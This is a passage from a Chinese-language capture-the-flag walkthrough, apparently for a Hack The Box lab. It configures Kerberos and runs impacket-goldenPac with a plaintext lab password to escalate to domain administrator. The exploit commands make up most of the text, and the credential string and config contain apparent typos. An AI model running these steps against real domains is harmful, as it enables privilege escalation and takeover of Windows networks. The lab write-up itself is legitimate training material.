我们探索了smb和ldap的输出内容，没有仍和值得关注的，到这一步我们进行不下去了。

通过检索找到一篇博客（https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html），可以通过获取DC管理员的金票从而来使自己变成域管理员

```
sudo apt-get install krb5-user cifs-utils
```

```
#添加10.10.10.52作为dns服务器
sudo vi /etc/resolv.conf
nameserver 10.10.10.52
#配置krb5.conf
sudo vi /etc/krb5.conf
[libdefaults]
    default_realm = HTB.LOCAL

[realms]
    htb.local = {
        kdc = mantis.htb.local:88
        admin_serve = mantis.htb.local
        default_domain = htb.local
    }
[domain_realm]
    .domain.internal = htb.local
    domain.internal = htb.local
```

进行攻击的时候需要ntpdate同步时间

我们在上述配置完成后进行测试连接，并生成kerberos票证

```
kinit james
klist
```

我们也可以直接使用impacket工具包中的goldenpac来实现这个漏洞的攻击

```
impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@ssW0rd!@mantis'
impacket-goldenPac -dc-ip 10.10.10.52 -target-ip 10.10.10.52 HTB.LOCAL/james@mantis.htb.local
```
